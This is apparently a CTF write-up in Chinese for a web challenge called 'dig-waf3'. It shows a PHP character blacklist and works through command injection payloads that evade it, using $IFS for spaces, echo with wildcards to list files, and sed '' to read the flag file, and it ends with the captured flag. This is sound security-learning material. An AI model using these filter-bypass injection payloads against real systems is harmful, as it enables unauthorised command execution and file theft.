#Web

## 題目

**dig-waf3**
給了一個網址，跟 [[Dig waf 2]] 的長一樣，但 blacklist 多了偵測 flag 四個字母
```php
$blacklist = ['|', '&', ';', '>', '<', "\n", "`", "f", "l", "a", "g", " "];
```

## 解題
1. 觀察網頁，
   發現不能使用空白 -> 使用 IFS 內建分隔符 `$IFS`
	   -->  `aaa'$IFS$(ls$IFS/)'`
	發現不能使用 "f"、"l"、"a"、"g" 
		--> `bbb'$IFS$(echo$IFS/*)'`
> `echo *` 能做到與 `ls` 一樣的效果

	![[W1-15_ls.png]]

2. 可以看到 flag 在檔案 `flag_o2837ry`，可以用 `*_o2837ry` 來存取
   但題目禁止字母 `a` -> 不能 `cat`、`grep`、`head`、`tail` 
   >[!abstract] 替代方案
   >- `sed '' [檔名]`：`sed` 是一個串流編輯器。若不給予任何修改指令（中間 `''` 部分留空），預設將文字內容逐行輸出至螢幕
   >- `od -c [檔名]`：`od` 用來逐字偵測內容，並以字元格式呈現

   --> 改用 `sed '' [檔名]` 
3. 輸入 `bbb'$IFS$(sed$IFS''$IFS/*_o2837ry)'`
   ![[W1-15_flag.png|510]]
4. flag = `CTF{digtools_waf3_d992ddeb285d1168c3d3db27}`






`bbb'$IFS$(sed$IFS''$IFS/*_o2837ry)'`